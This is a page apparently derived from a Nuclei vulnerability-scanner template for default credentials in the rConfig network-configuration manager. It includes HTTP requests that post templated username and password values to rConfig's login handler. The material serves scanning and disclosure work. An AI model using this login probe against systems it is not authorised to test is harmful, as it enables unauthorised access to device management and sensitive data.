# Nuclei Template: rConfig - Default Login
**Template ID:** rconfig-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`rconfig-default-login.yaml`)

## Vulnerability Information & PoC

## Description
rConfig contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /login.php HTTP/1.1
Host: {{Hostname}}

POST /lib/crud/userprocess.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&pass={{password}}&sublogin=1
```

## References
- https://github.com/rconfig/rconfig
